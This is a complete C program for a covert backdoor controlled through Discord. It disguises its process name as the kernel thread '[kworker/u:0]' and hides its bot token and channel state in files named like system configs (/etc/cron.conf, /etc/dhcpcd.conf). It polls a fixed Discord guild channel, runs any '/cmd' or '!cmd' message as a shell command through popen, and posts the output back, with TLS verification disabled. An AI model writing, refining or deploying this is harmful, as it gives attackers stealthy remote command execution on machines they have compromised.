#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <ctype.h>
#include <errno.h>

#define MAX_PROCESS 2
#define POLL_SLEEP 2
#define MSG_LIMIT 15
#define RECENT_CAP 200
#define TOKEN_FILE "/etc/cron.conf"
#define ID_MAX_LEN 64

static const char *GUILD_ID = "1415674125816434742";
static const char *LOG_DIR = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP";
static const char *LOG_FILE = "/etc/dhcpcd.conf";
static const char *API_BASE = "https://discord.com/api/v10";

struct string { char *ptr; size_t len; };
struct msg { char *id; char *content; char *author_id; };

static char *BOT_TOKEN = NULL;
static char BOT_USER_ID[64] = {0};
static char *recent_keys[RECENT_CAP];
static size_t recent_count = 0;

static void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(1);
    if (!s->ptr) { fprintf(stderr,"malloc failed\n"); exit(1); }
    s->ptr[0] = '\0';
}

static size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s) {
    size_t add = size * nmemb;
    size_t new_len = s->len + add;
    s->ptr = realloc(s->ptr, new_len + 1);
    if (!s->ptr) { fprintf(stderr,"realloc failed\n"); exit(1); }
    memcpy(s->ptr + s->len, ptr, add);
    s->ptr[new_len] = '\0';
    s->len = new_len;
    return add;
}

static char *read_token_from_file(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Failed to open %s: %s\n", path, strerror(errno));
        return NULL;
    }
    
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    
    if (n <= 0) return NULL;
    buf[n] = '\0';
    
    char *token = strstr(buf, "DISCORD_BOT_TOKEN=");
    if (!token) return NULL;
    
    token += strlen("DISCORD_BOT_TOKEN=");
    char *end = strchr(token, '\n');
    if (end) *end = '\0';
    end = strchr(token, '\r');
    if (end) *end = '\0';
    
    return strdup(token);
}

static char *make_api_request(const char *method, const char *endpoint, const char *data, long *out_code) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    
    struct string s;
    init_string(&s);
    
    char url[1024];
    snprintf(url, sizeof(url), "%s%s", API_BASE, endpoint);
    
    struct curl_slist *headers = NULL;
    char auth_hdr[1024];
    snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: Bot %s", BOT_TOKEN);
    headers = curl_slist_append(headers, auth_hdr);
    headers = curl_slist_append(headers, "Content-Type: application/json");
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "discord-bot/1.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    if (strcasecmp(method, "GET") == 0)
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    else if (strcasecmp(method, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (data) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    }
    
    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    else
        fprintf(stderr, "[curl] error: %s\n", curl_easy_strerror(res));
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    *out_code = http_code;
    return s.ptr;
}

static int file_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && st.st_size > 0;
}

static char *json_escape(const char *s) {
    size_t len = strlen(s);
    char *out = malloc(len * 4 + 1);
    char *p = out;
    for (size_t i = 0; i < len; ++i) {
        char c = s[i];
        if (c == '\\' || c == '\"' || c == '\n') {
            *p++ = '\\';
            if (c == '\n') *p++ = 'n';
            else *p++ = c;
        } else *p++ = c;
    }
    *p = '\0';
    return out;
}

static char *extract_id(const char *p) {
    const char *q = p;
    while (*q && *q != '\"') q++;
    size_t n = q - p;
    if (n == 0) return NULL;
    char *id = malloc(n+1);
    strncpy(id, p, n);
    id[n] = '\0';
    return id;
}

static char *extract_content(const char *start) {
    const char *cpos = strstr(start, "\"content\":\"");
    if (!cpos) return NULL;
    cpos += strlen("\"content\":\"");
    
    size_t cap = 256;
    char *tmp = malloc(cap);
    if (!tmp) return NULL;
    
    size_t ti = 0;
    int escaped = 0;
    const char *q = cpos;
    
    while (*q) {
        if (*q == '\"' && !escaped) break;
        if (*q == '\\' && !escaped) {
            escaped = 1;
            q++;
            continue;
        }
        if (escaped) {
            char c = (*q == 'n') ? '\n' : (*q == 'r') ? '\r' : (*q == 't') ? '\t' : *q;
            if (ti + 1 >= cap) {
                cap *= 2;
                tmp = realloc(tmp, cap);
                if (!tmp) return NULL;
            }
            tmp[ti++] = c;
            escaped = 0;
            q++;
        } else {
            if (ti + 1 >= cap) {
                cap *= 2;
                tmp = realloc(tmp, cap);
                if (!tmp) return NULL;
            }
            tmp[ti++] = *q++;
        }
    }
    tmp[ti] = '\0';
    char *out = strdup(tmp);
    free(tmp);
    return out;
}

static char *extract_author(const char *start) {
    const char *p = strstr(start, "\"author\":");
    if (!p) return NULL;
    p = strstr(p, "\"id\":\"");
    if (!p) return NULL;
    p += strlen("\"id\":\"");
    return extract_id(p);
}

static struct msg *collect_messages(const char *resp, size_t *cnt) {
    const char *p = resp;
    struct msg *arr = NULL;
    size_t cap = 0, count = 0;
    
    while ((p = strstr(p, "\"id\":\"")) != NULL) {
        const char *valstart = p + strlen("\"id\":\"");
        char *id = extract_id(valstart);
        if (!id) {
            p = valstart;
            continue;
        }
        
        const char *objstart = p;
        while (objstart > resp && *objstart != '{') objstart--;
        
        char *content = extract_content(objstart);
        char *author = extract_author(objstart);
        
        if (count + 1 > cap) {
            cap = cap ? cap*2 : 8;
            arr = realloc(arr, cap * sizeof(struct msg));
            if (!arr) { free(id); return NULL; }
        }
        
        arr[count].id = id;
        arr[count].content = content;
        arr[count].author_id = author;
        count++;
        p = valstart;
    }
    
    *cnt = count;
    return arr;
}

static void add_recent(const char *aid, const char *content) {
    if (!aid || !content) return;
    
    size_t keylen = strlen(aid) + strlen(content) + 2;
    char *key = malloc(keylen);
    if (!key) return;
    
    snprintf(key, keylen, "%s|%s", aid, content);
    
    if (recent_count >= RECENT_CAP) {
        free(recent_keys[0]);
        memmove(recent_keys, recent_keys+1, (RECENT_CAP-1) * sizeof(char*));
        recent_keys[RECENT_CAP-1] = key;
    } else {
        recent_keys[recent_count++] = key;
    }
}

static int is_recent(const char *aid, const char *content) {
    if (!aid || !content) return 0;
    
    for (size_t i = 0; i < recent_count; i++) {
        char *k = recent_keys[i];
        if (!k) continue;
        
        size_t aidlen = strlen(aid);
        if (strncmp(k, aid, aidlen) == 0 && k[aidlen] == '|' &&
            strcmp(k + aidlen + 1, content) == 0) return 1;
    }
    return 0;
}

static void post_msg(const char *cid, const char *msg) {
    char ep[256];
    snprintf(ep, sizeof(ep), "/channels/%s/messages", cid);
    
    char *esc = json_escape(msg);
    char body[4096];
    snprintf(body, sizeof(body), "{\"content\": \"%s\"}", esc);
    free(esc);
    
    long code;
    char *r = make_api_request("POST", ep, body, &code);
    if (r) free(r);
}

static void run_cmd(const char *cid, const char *cmd) {
    if (!cmd || !*cmd) {
        post_msg(cid, "[empty command]");
        return;
    }
    
    fprintf(stderr, "[EXEC] %s\n", cmd);
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        post_msg(cid, "[popen failed]");
        return;
    }
    
    char buf[4096];
    int had = 0;
    while (fgets(buf, sizeof(buf), fp)) {
        had = 1;
        size_t l = strlen(buf);
        if (l && buf[l-1] == '\n') buf[l-1] = '\0';
        post_msg(cid, *buf ? buf : "[empty line]");
    }
    
    if (!had) post_msg(cid, "[no output]");
    pclose(fp);
}

static int create_dir(const char *path) {
    struct stat st;
    if (stat(path, &st) == 0) return S_ISDIR(st.st_mode) ? 0 : -1;
    return mkdir(path, 0755);
}

static char *read_id(const char *path) {
    if (!file_exists(path)) return NULL;
    
    FILE *f = fopen(path, "r");
    if (!f) return NULL;
    
    char buf[128];
    char *id = NULL;
    
    if (fgets(buf, sizeof(buf), f)) {
        char *nl = strchr(buf, '\n');
        if (nl) *nl = '\0';
        
        int ok = 1, len = strlen(buf);
        if (len < 16 || len > 22) ok = 0;
        for (int i = 0; i < len && ok; i++)
            if (!isdigit((unsigned char)buf[i])) ok = 0;
        
        if (ok) id = strdup(buf);
    }
    
    fclose(f);
    return id;
}

static void write_id(const char *path, const char *id) {
    FILE *f = fopen(path, "w");
    if (f) {
        fprintf(f, "%s\n", id);
        fclose(f);
    }
}

int main(int argc, char *argv[]) {
    // Rename process exactly like your example
    prctl(PR_SET_NAME, "[kworker/u:0]");
    
    // Rename argv[0] so ps shows it
    if (argc > 0 && argv[0]) {
        strcpy(argv[0], "[kworker/u:0]");
    }
    
    BOT_TOKEN = read_token_from_file(TOKEN_FILE);
    if (!BOT_TOKEN) {
        fprintf(stderr, "Failed to read token from %s\n", TOKEN_FILE);
        return 1;
    }
    
    create_dir(LOG_DIR);
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    char *CHANNEL_ID = read_id(LOG_FILE);
    
    if (!CHANNEL_ID) {
        char randname[32];
        srand(time(NULL) ^ getpid());
        const char *chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        for (int i = 0; i < 6; i++)
            randname[i] = chars[rand() % 36];
        randname[6] = '\0';
        
        char chan_name[64];
        snprintf(chan_name, sizeof(chan_name), "sess_%s", randname);
        
        char body[256];
        snprintf(body, sizeof(body), "{\"name\":\"%s\",\"type\":0}", chan_name);
        
        long code;
        char ep[256];
        snprintf(ep, sizeof(ep), "/guilds/%s/channels", GUILD_ID);
        
        char *resp = make_api_request("POST", ep, body, &code);
        
        if (code == 201 && resp) {
            char *found = strstr(resp, "\"id\":\"");
            if (found) {
                found += strlen("\"id\":\"");
                char *q = found;
                while (*q && *q != '\"') q++;
                size_t n = q - found;
                if (n > 0) {
                    CHANNEL_ID = malloc(n+1);
                    strncpy(CHANNEL_ID, found, n);
                    CHANNEL_ID[n] = '\0';
                    write_id(LOG_FILE, CHANNEL_ID);
                    fprintf(stderr, "[INFO] Created channel %s\n", CHANNEL_ID);
                }
            }
            free(resp);
        } else {
            fprintf(stderr, "[ERR] Failed to create channel (HTTP %ld)\n", code);
            if (resp) free(resp);
            curl_global_cleanup();
            return 1;
        }
    } else {
        fprintf(stderr, "[INFO] Using channel: %s\n", CHANNEL_ID);
    }
    
    long code;
    char *resp = make_api_request("GET", "/users/@me", NULL, &code);
    if (resp && code == 200) {
        char *p = strstr(resp, "\"id\":\"");
        if (p) {
            p += strlen("\"id\":\"");
            char *q = p;
            while (*q && *q != '\"') q++;
            size_t n = q - p;
            if (n > 0 && n < sizeof(BOT_USER_ID)) {
                strncpy(BOT_USER_ID, p, n);
                BOT_USER_ID[n] = '\0';
            }
        }
    }
    if (resp) free(resp);
    
    char ep[256];
    snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
    char body[128];
    snprintf(body, sizeof(body), "{\"content\":\"Bot started\"}");
    resp = make_api_request("POST", ep, body, &code);
    if (resp) free(resp);
    
    fprintf(stderr, "[INFO] Bot started\n");
    
    char *LAST_SEEN = NULL;
    snprintf(ep, sizeof(ep), "/channels/%s/messages?limit=1", CHANNEL_ID);
    resp = make_api_request("GET", ep, NULL, &code);
    if (resp && code == 200) {
        char *p = strstr(resp, "\"id\":\"");
        if (p) {
            p += strlen("\"id\":\"");
            char *q = p;
            while (*q && *q != '\"') q++;
            size_t n = q - p;
            if (n > 0) {
                LAST_SEEN = malloc(n+1);
                strncpy(LAST_SEEN, p, n);
                LAST_SEEN[n] = '\0';
            }
        }
    }
    if (resp) free(resp);
    
    int backoff = 1;
    while (1) {
        snprintf(ep, sizeof(ep), "/channels/%s/messages?limit=%d", CHANNEL_ID, MSG_LIMIT);
        resp = make_api_request("GET", ep, NULL, &code);
        
        if (!resp) { sleep(POLL_SLEEP); continue; }
        
        if (code == 429) {
            const char *p = strstr(resp, "\"retry_after\":");
            int retry = backoff;
            if (p) {
                p += strlen("\"retry_after\":");
                retry = atoi(p);
                if (retry <= 0) retry = backoff;
            }
            free(resp);
            sleep(retry);
            if (backoff < 64) backoff *= 2;
            continue;
        }
        
        backoff = 1;
        
        if (code != 200) {
            free(resp);
            sleep(POLL_SLEEP);
            continue;
        }
        
        size_t msg_cnt = 0;
        struct msg *msgs = collect_messages(resp, &msg_cnt);
        
        if (!msgs || msg_cnt == 0) {
            if (msgs) free(msgs);
            free(resp);
            sleep(POLL_SLEEP);
            continue;
        }
        
        if (!LAST_SEEN) {
            LAST_SEEN = strdup(msgs[0].id);
        } else {
            ssize_t found = -1;
            for (size_t i = 0; i < msg_cnt; i++) {
                if (msgs[i].id && strcmp(msgs[i].id, LAST_SEEN) == 0) {
                    found = i;
                    break;
                }
            }
            
            if (found == -1) {
                free(LAST_SEEN);
                LAST_SEEN = strdup(msgs[0].id);
            } else if (found > 0) {
                ssize_t start = found - (found > MAX_PROCESS ? MAX_PROCESS : found);
                for (ssize_t i = start; i < found; i++) {
                    struct msg *m = &msgs[i];
                    const char *content = m->content ? m->content : "";
                    const char *aid = m->author_id ? m->author_id : "";
                    
                    if (!*content) continue;
                    if (m->author_id && *BOT_USER_ID && strcmp(m->author_id, BOT_USER_ID) == 0) continue;
                    if (is_recent(aid, content)) continue;
                    
                    add_recent(aid, content);
                    
                    if (strncmp(content, "/cmd", 4) == 0 || strncmp(content, "!cmd", 4) == 0) {
                        const char *cmd = content + 4;
                        while (*cmd == ' ') cmd++;
                        if (*cmd) run_cmd(CHANNEL_ID, cmd);
                        else post_msg(CHANNEL_ID, "[no command]");
                    }
                }
                free(LAST_SEEN);
                LAST_SEEN = strdup(msgs[0].id);
            }
        }
        
        for (size_t i = 0; i < msg_cnt; i++) {
            free(msgs[i].id);
            free(msgs[i].content);
            free(msgs[i].author_id);
        }
        free(msgs);
        free(resp);
        sleep(POLL_SLEEP);
    }
    
    for (size_t i = 0; i < recent_count; i++) free(recent_keys[i]);
    free(CHANNEL_ID);
    free(LAST_SEEN);
    free(BOT_TOKEN);
    curl_global_cleanup();
    return 0;
}
